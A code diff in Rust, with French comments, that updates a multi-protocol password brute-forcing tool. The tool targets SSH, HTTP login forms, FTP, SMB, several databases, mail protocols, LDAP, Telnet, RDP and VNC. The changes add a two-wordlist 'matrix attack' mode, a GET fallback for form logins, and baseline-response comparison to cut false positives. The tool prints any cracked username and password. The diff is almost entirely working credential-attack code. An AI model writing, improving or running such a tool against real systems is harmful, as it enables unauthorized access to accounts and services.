@@ -5,9 +5,10 @@ use clap::Parser;
 use sqlx::{Connection, MySqlConnection};
 use std::sync::Arc;
 use tokio::sync::Semaphore;
-use tokio::fs::File;
-use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt, BufReader};
+// use tokio::fs::File;
+use tokio::io::{AsyncBufReadExt, AsyncWriteExt, AsyncReadExt};
 use colored::*;
+use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT, ACCEPT_LANGUAGE};
 use russh::*;
 use russh_keys::*;
 use async_trait::async_trait;
@@ -20,7 +21,7 @@ use tokio::task::JoinSet;
 use tokio::time::{timeout, Duration};
 use std::sync::atomic::{AtomicBool, Ordering};
 use tokio::net::TcpStream;
-use std::io::{self, Write};
+use std::io::{ Write};
 async fn is_anonymous_login(service: &str, host: &str, port: u16, user: &str, pass: &str) -> bool {
     let addr = format!("{}:{}", host, port);
 
@@ -225,7 +226,7 @@ async fn attempt_imap(host: &str, port: u16, user: &str, pass: &str) -> bool {
 async fn attempt_mysql(host: &str, port: u16, user: &str, pass: &str) -> bool {
     let url = format!("mysql://{}:{}@{}:{}", user, pass, host, port);
     match timeout(Duration::from_secs(3), MySqlConnection::connect(&url)).await {
-        Ok(Ok(conn)) => { // Retrait de mut ici
+        Ok(Ok(conn)) => { 
             let _ = conn.close().await; 
             true
         }
@@ -304,7 +305,36 @@ fn find_name_by_type(html: &str, target_type: &str) -> Option<String> {
     }
     None
 }
+async fn get_fake_body(
+    client: &reqwest::Client,
+    target: &str,
+    port: u16,
+    u_selector: &str,
+    p_selector: &str,
+) -> String {
+    let url = if target.starts_with("http") {
+        target.to_string()
+    } else {
+        let proto = if port == 443 { "https" } else { "http" };
+        format!("{}://{}:{}", proto, target, port)
+    };
 
+    // Identifiants bidons pour générer une page d'erreur type
+    let fake_user = "non_existent_user_xyz_123";
+    let fake_pass = "non_existent_pass_xyz_123";
+
+    let params = [
+        (u_selector.trim(), fake_user),
+        (p_selector.trim(), fake_pass),
+    ];
+
+    let res = match client.post(&url).form(&params).send().await {
+        Ok(r) => r,
+        Err(_) => return String::new(),
+    };
+
+    res.text().await.unwrap_or_default()
+}
 
 async fn attempt_http(
     client: &reqwest::Client,
@@ -315,8 +345,9 @@ async fn attempt_http(
     error_msg: &Option<String>,
     u_selector: &str,
     p_selector: &str,
+    fake_body: &str, // Passé en paramètre maintenant
 ) -> bool {
-    let url = if target.starts_with("http:") {
+    let url = if target.starts_with("http:") || target.starts_with("https:") {
         target.to_string()
     } else {
         let proto = if port == 443 { "https" } else { "http" };
@@ -325,14 +356,39 @@ async fn attempt_http(
 
     let params = [(u_selector.trim(), user.trim()), (p_selector.trim(), pass.trim())];
 
-    let res = match client.post(&url).form(&params).send().await {
+  
+
+    // Tentative POST d'abord
+    let res_post = client.post(&url).form(&params).send().await;
+
+    // Si POST échoue, on tente GET
+    let res = match res_post {
         Ok(r) => r,
-        Err(_) => return false,
+        Err(_) => {
+            let full_url = match reqwest::Url::parse_with_params(&url, &params) {
+                Ok(u) => u,
+                Err(_) => return false,
+            };
+            match client.get(full_url).send().await {
+                Ok(r) => r,
+                Err(_) => return false,
+            }
+        }
     };
 
     let status = res.status();
-    let content_type = res.headers().get("content-type").and_then(|v| v.to_str().ok()).unwrap_or("").to_lowercase();
-    let redirect_url = res.headers().get("location").and_then(|l| l.to_str().ok()).map(|s| s.to_string()).unwrap_or_default();
+    let content_type = res
+        .headers()
+        .get("content-type")
+        .and_then(|v| v.to_str().ok())
+        .unwrap_or("")
+        .to_lowercase();
+    let redirect_url = res
+        .headers()
+        .get("location")
+        .and_then(|l| l.to_str().ok())
+        .map(|s| s.to_string())
+        .unwrap_or_default();
 
     let body = res.text().await.unwrap_or_default();
     let body_low = body.to_lowercase();
@@ -345,9 +401,14 @@ async fn attempt_http(
 
     if content_type.contains("application/json") {
         if status.is_success() && !error_found {
-            let success_indicators = ["\"success\":true", "\"authenticated\":true", "\"token\"", "\"access_token\""];
-            if success_indicators.iter().any(|&s| body_low.contains(s)) { return true; }
-            if error_msg.is_some() && !error_found { return true; }
+            let success_indicators =
+                ["\"success\":true", "\"authenticated\":true", "\"token\"", "\"access_token\""];
+            if success_indicators.iter().any(|&s| body_low.contains(s)) {
+                return true && body != fake_body;
+            }
+            if error_msg.is_some() && !error_found {
+                return true && body != fake_body;
+            }
         }
         return false;
     }
@@ -357,16 +418,37 @@ async fn attempt_http(
     let inputs_present = body_low.contains(&u_pattern) || body_low.contains(&p_pattern);
 
     if status.is_redirection() && !redirect_url.is_empty() {
-        let red_low = redirect_url.to_lowercase();
-        let is_login_page = red_low == url.to_lowercase() || red_low.ends_with("/login");
-        if is_login_page { return false; }
-        return !error_found;
+        // Normalisation inline
+        let mut red_low = redirect_url.trim().to_lowercase();
+        if red_low.ends_with('/') { red_low.pop(); }
+        if let Ok(parsed) = reqwest::Url::parse(&red_low) {
+            red_low = format!("{}://{}{}", parsed.scheme(), parsed.host_str().unwrap_or(""), parsed.path());
+            if red_low.ends_with('/') { red_low.pop(); }
+        }
+
+        let mut clean_url = url.trim().to_lowercase();
+        if clean_url.ends_with('/') { clean_url.pop(); }
+        if let Ok(parsed) = reqwest::Url::parse(&clean_url) {
+            clean_url = format!("{}://{}{}", parsed.scheme(), parsed.host_str().unwrap_or(""), parsed.path());
+            if clean_url.ends_with('/') { clean_url.pop(); }
+        }
+
+        let is_login_page = red_low == clean_url;
+        if is_login_page {
+            return false;
+        }
+        return !error_found && body != fake_body;
     }
 
-    if status.is_success() && !error_found && !inputs_present { return true; }
-    !inputs_present && !error_found && !status.is_server_error()
+    if status.is_success() && !error_found && !inputs_present {
+        return true && body != fake_body;
+    }
+
+    !inputs_present && !error_found && !status.is_server_error() && body != fake_body
 }
-  
+
+
+
 async fn attempt_vnc(host: &str, port: u16, _pass: &str) -> bool { 
     let addr = format!("{}:{}", host, port);
     let mut stream = match timeout(Duration::from_secs(3), TcpStream::connect(&addr)).await {
@@ -441,10 +523,16 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
 
  
-    let f_dict = File::open(&args.wordlist).await?;
-    let mut lines = BufReader::new(f_dict).lines();
-    let mut set = JoinSet::new();
+   // --- 1. DÉFINITION DES FLUX (MODE 1 OU 2 WORDLISTS) ---
+    let (mut user_lines, pass_file_path) = if args.wordlist.len() == 2 {
+        let f_user = tokio::fs::File::open(&args.wordlist[0]).await?;
+        (tokio::io::BufReader::new(f_user).lines(), Some(args.wordlist[1].clone()))
+    } else {
+        let f_single = tokio::fs::File::open(&args.wordlist[0]).await?;
+        (tokio::io::BufReader::new(f_single).lines(), None)
+    };
 
+    let mut set = JoinSet::new();
     let target_user = args.user.as_deref().unwrap_or("multi");
     let cache_file = format!(".supnum_cache_{}_{}_{}", 
         host_only.replace(".", "_"), 
@@ -453,12 +541,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     );
 
     if args.init {
-        let _ = std::fs::remove_file(&cache_file); // Correction Ownership &
+        let _ = std::fs::remove_file(&cache_file);
         println!("{} Cache initialisé.", "[*]".yellow());
     }
 
     let mut start_line = 0;
-    if let Ok(content) = std::fs::read_to_string(&cache_file) { // Correction Ownership &
+    if let Ok(content) = std::fs::read_to_string(&cache_file) {
         start_line = content.trim().parse::<usize>().unwrap_or(0);
         if start_line > 0 { println!("{} Reprise à la ligne : {}", "[*]".cyan(), start_line); }
     }
@@ -469,130 +557,130 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
   
     let t_delay = args.delay; 
     let mut current_line = 0;
-  
-let mut skip_anonymous = false;
+    let mut skip_anonymous = false;
 
-if t_service_lower == "ftp" || t_service_lower == "smb" {
-    println!("{} Vérification de la politique d'accès du serveur...", "[*]".cyan());
-    
-  
-    let is_anonymous = check_anonymous(&t_service_lower, &host_only, port_to_use).await;
-    
-    if is_anonymous {
-        println!("\n{}", "====================================================".yellow().bold());
-        println!("{} ATTENTION : Le serveur accepte les connexions ANONYMES !", "[!]".yellow().bold());
-        println!("{} (Le brute-force risque de générer des milliers de faux succès)", "[!]".yellow());
-        println!("{}", "====================================================".yellow().bold());
-        
-        print!("{} Voulez-vous IGNORER l'utilisateur 'anonymous' pour la suite ? (Y/n): ", "[?]".blue());
-        io::stdout().flush()?;
-        let mut ans = String::new();
-        io::stdin().read_line(&mut ans)?;
-        
-        if ans.trim().to_lowercase() != "n" {
-            skip_anonymous = true;
-            println!("{} L'utilisateur 'anonymous' sera filtré.", "[*]".green());
-        }
-    }
-}
-
-
-
-   while let Ok(Some(line)) = lines.next_line().await {
-        current_line += 1; 
-        if current_line <= start_line { continue; }
-        let raw_line = line.trim().to_string();
-        if raw_line.is_empty() { continue; }
-
-        if current_line % 100 == 0 {
-            let _ = std::fs::write(&cache_file, current_line.to_string());
-        }
-
-        let (u, p) = if let (Some(fu), Some(fp)) = (&args.user, &args.password) { (fu.clone(), fp.clone()) }
-        else if let Some(fu) = &args.user { (fu.clone(), raw_line) }
-        else if let Some(fp) = &args.password { (raw_line, fp.clone()) }
-        else if raw_line.contains(':') {
-            let parts: Vec<&str> = raw_line.splitn(2, ':').collect();
-            (parts[0].to_string(), parts[1].to_string())
-        } else { (raw_line.clone(), raw_line.clone()) };
-  
-        let (t_u, t_p) = (u, p);
-        let t_host = host_only.clone();
-        let t_url = input_target.to_string(); 
-        let t_service = t_service_lower.clone();
-        let t_client = Arc::clone(&client);
-        let t_success = Arc::clone(&success_found);
-        let t_error = args.error.clone();
-        let (t_uf, t_pf) = (u_field.clone(), p_field.clone());
-        let t_port = port_to_use;
-        let t_cache_name = cache_file.clone(); 
-        let skip_anon_flag = skip_anonymous; // Capturer la valeur pour le thread
-
-        let permit = Arc::clone(&semaphore).acquire_owned().await?;
-        
-        set.spawn(async move {
-            let _permit = permit;
-            if t_success.load(Ordering::SeqCst) { return; }
-            if let Some(ms) = t_delay { tokio::time::sleep(Duration::from_millis(ms)).await; }
-  
-            // On utilise une seule variable is_ok pour tout le match
-            let is_ok = match t_service.as_str() {
-                "ssh" => attempt_ssh_async(&t_host, t_port, &t_u, &t_p).await,
-                "http" | "https" => attempt_http(&t_client, &t_url, t_port, &t_u, &t_p, &t_error, &t_uf, &t_pf).await,
-                "ftp" => {
-                    let addr = format!("{}:{}", t_host, t_port);
-                    let mut login_success = false;
-                    if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(addr)).await {
-                        if ftp.login(&t_u, &t_p).await.is_ok() {
-                            if skip_anon_flag {
-                                let pwd_user = ftp.pwd().await.unwrap_or_default();
-                                let _ = ftp.quit().await;
-                                if let Ok(Ok(mut ftp_f)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(format!("{}:{}", t_host, t_port))).await {
-                                    if ftp_f.login("ghost_99", "ghost_99").await.is_ok() {
-                                        if pwd_user == ftp_f.pwd().await.unwrap_or_default() { 
-                                            let _ = ftp_f.quit().await;
-                                            return; // C'est un anonyme, on sort du spawn
-                                        }
-                                    }
-                                }
-                            }
-                            login_success = true;
-                        }
-                    }
-                    login_success // On retourne le booléen pour le match
-                },
-                "smb" => {
-                    let mut smb_ok = attempt_smb(&t_host, &t_u, &t_p).await;
-                    if smb_ok && skip_anon_flag {
-                        if is_anonymous_login("smb", &t_host, t_port, &t_u, &t_p).await { return; }
-                    }
-                    smb_ok
-                },
-                "mysql"    => attempt_mysql(&t_host, t_port, &t_u, &t_p).await,
-                "postgres" => attempt_postgres(&t_host, t_port, &t_u, &t_p).await,
-                "mongodb"  => attempt_mongodb(&t_host, t_port, &t_u, &t_p).await,
-                "smtp"     => attempt_smtp(&t_host, t_port, &t_u, &t_p).await,
-                "pop3"     => attempt_pop3(&t_host, t_port, &t_u, &t_p).await,
-                "imap"     => attempt_imap(&t_host, t_port, &t_u, &t_p).await,
-                "ldap"     => attempt_ldap(&t_host, t_port, &t_u, &t_p).await,
-                "telnet"   => attempt_telnet(&t_host, t_port, &t_u, &t_p).await,
-                "rdp"      => attempt_rdp(&t_host, t_port, &t_u, &t_p).await,
-                "vnc"      => attempt_vnc(&t_host, t_port, &t_p).await,
-                _ => false,
-            };
-   
-            if is_ok && !t_success.swap(true, Ordering::SeqCst) {
-                let _ = std::fs::remove_file(&t_cache_name); 
-                println!("\n\n{}", "====================================================".green().bold());
-                println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
-                println!("{} UTILISATEUR : {}", " >".cyan(), t_u.bright_white().bold());
-                println!("{} MOT DE PASSE : {}", " >".cyan(), t_p.bright_yellow().bold());
-                println!("{}", "====================================================".green().bold());
-                std::process::exit(0);
+    // --- 2. VÉRIFICATION ANONYMOUS ---
+    if t_service_lower == "ftp" || t_service_lower == "smb" {
+        println!("{} Vérification de la politique d'accès du serveur...", "[*]".cyan());
+        let is_anonymous = check_anonymous(&t_service_lower, &host_only, port_to_use).await;
+        if is_anonymous {
+            println!("\n{}", "====================================================".yellow().bold());
+            println!("{} ATTENTION : Le serveur accepte les connexions ANONYMES !", "[!]".yellow().bold());
+            println!("{}", "====================================================".yellow().bold());
+            print!("{} Voulez-vous IGNORER l'utilisateur 'anonymous' ? (Y/n): ", "[?]".blue());
+            let _ = std::io::stdout().flush();
+            let mut ans = String::new();
+            let _ = std::io::stdin().read_line(&mut ans);
+            if ans.trim().to_lowercase() != "n" {
+                skip_anonymous = true;
+                println!("{} L'utilisateur 'anonymous' sera filtré.", "[*]".green());
             }
-        });
+        }
     }
+ let fake_body = get_fake_body(&client, &input_target, port_to_use, &u_field, &p_field).await;
+    // --- 3. BOUCLE PRINCIPALE ---
+    while let Ok(Some(line1)) = user_lines.next_line().await {
+        let raw1 = line1.trim().to_string();
+        if raw1.is_empty() { continue; }
 
+        // Préparation des paires (User, Pass)
+        let mut pairs = Vec::new();
+
+        if let Some(pass_path) = &pass_file_path {
+            // --- CAS A : DEUX FICHIERS (Matrix Attack) ---
+            let f_pass = tokio::fs::File::open(pass_path).await?;
+            let mut pass_inner = tokio::io::BufReader::new(f_pass).lines();
+            while let Ok(Some(line2)) = pass_inner.next_line().await {
+                let raw2 = line2.trim().to_string();
+                if !raw2.is_empty() { pairs.push((raw1.clone(), raw2)); }
+            }
+        } else {
+            // --- CAS B : UN SEUL FICHIER (Logic Originale) ---
+            current_line += 1;
+            if current_line <= start_line { continue; }
+            if current_line % 100 == 0 { let _ = std::fs::write(&cache_file, current_line.to_string()); }
+
+            let (u, p) = if let (Some(fu), Some(fp)) = (&args.user, &args.password) { (fu.clone(), fp.clone()) }
+            else if let Some(fu) = &args.user { (fu.clone(), raw1.clone()) }
+            else if let Some(fp) = &args.password { (raw1.clone(), fp.clone()) }
+            else if raw1.contains(':') {
+                let parts: Vec<&str> = raw1.splitn(2, ':').collect();
+                (parts[0].to_string(), parts[1].to_string())
+            } else { (raw1.clone(), raw1.clone()) };
+            pairs.push((u, p));
+        }
+
+        // --- EXÉCUTION DES ATTAQUES ---
+        for (u, p) in pairs {
+            if success_found.load(Ordering::SeqCst) { break; }
+            
+            let t_u = u; let t_p = p;
+            let t_host = host_only.clone();
+            let t_url = input_target.to_string(); 
+            let t_service = t_service_lower.clone();
+            let t_client = Arc::clone(&client);
+            let t_success = Arc::clone(&success_found);
+            let t_error = args.error.clone();
+            let (t_uf, t_pf) = (u_field.clone(), p_field.clone());
+            let t_port = port_to_use;
+            let t_cache_name = cache_file.clone(); 
+            let skip_anon_flag = skip_anonymous;
+
+            let permit = Arc::clone(&semaphore).acquire_owned().await?;
+            let t_fake = fake_body.clone();
+            set.spawn(async move {
+                let _permit = permit;
+                if t_success.load(Ordering::SeqCst) { return; }
+                if let Some(ms) = t_delay { tokio::time::sleep(Duration::from_millis(ms)).await; }
+
+                let is_ok = match t_service.as_str() {
+                    "ssh" => attempt_ssh_async(&t_host, t_port, &t_u, &t_p).await,
+                   "http" | "https" => attempt_http(&t_client, &t_url, t_port, &t_u, &t_p, &t_error, &t_uf, &t_pf, &t_fake).await,
+                    "ftp" => {
+                        let addr = format!("{}:{}", t_host, t_port);
+                        let mut ok = false;
+                        if let Ok(Ok(mut ftp)) = timeout(Duration::from_secs(4), AsyncFtpStream::connect(addr)).await {
+                            if ftp.login(&t_u, &t_p).await.is_ok() {
+                                if skip_anon_flag && t_u == "anonymous" { return; }
+                                ok = true;
+                            }
+                        }
+                        ok
+                    },
+                    "smb" => {
+                        let ok = attempt_smb(&t_host, &t_u, &t_p).await;
+                        if ok && skip_anon_flag && is_anonymous_login("smb", &t_host, t_port, &t_u, &t_p).await { return; }
+                        ok
+                    },
+                    "mysql"    => attempt_mysql(&t_host, t_port, &t_u, &t_p).await,
+                    "postgres" => attempt_postgres(&t_host, t_port, &t_u, &t_p).await,
+                    "mongodb"  => attempt_mongodb(&t_host, t_port, &t_u, &t_p).await,
+                    "smtp"     => attempt_smtp(&t_host, t_port, &t_u, &t_p).await,
+                    "pop3"     => attempt_pop3(&t_host, t_port, &t_u, &t_p).await,
+                    "imap"     => attempt_imap(&t_host, t_port, &t_u, &t_p).await,
+                    "ldap"     => attempt_ldap(&t_host, t_port, &t_u, &t_p).await,
+                    "telnet"   => attempt_telnet(&t_host, t_port, &t_u, &t_p).await,
+                    "rdp"      => attempt_rdp(&t_host, t_port, &t_u, &t_p).await,
+                    "vnc"      => attempt_vnc(&t_host, t_port, &t_p).await,
+                    _ => false,
+                };
+
+                if is_ok && !t_success.swap(true, Ordering::SeqCst) {
+                    let _ = std::fs::remove_file(&t_cache_name); 
+                    println!("\n\n{}", "====================================================".green().bold());
+                    println!("{} SUCCÈS TROUVÉ !", "[+]".green().bold());
+                    println!("{} UTILISATEUR : {}", " >".cyan(), t_u.bright_white().bold());
+                    println!("{} MOT DE PASSE : {}", " >".cyan(), t_p.bright_yellow().bold());
+                    println!("{}", "====================================================".green().bold());
+                    std::process::exit(0);
+                }
+            });
+        }
+        if success_found.load(Ordering::SeqCst) { break; }
+    }
     while let Some(_) = set.join_next().await {}
     Ok(())
-}
+    }
+
+ 
+
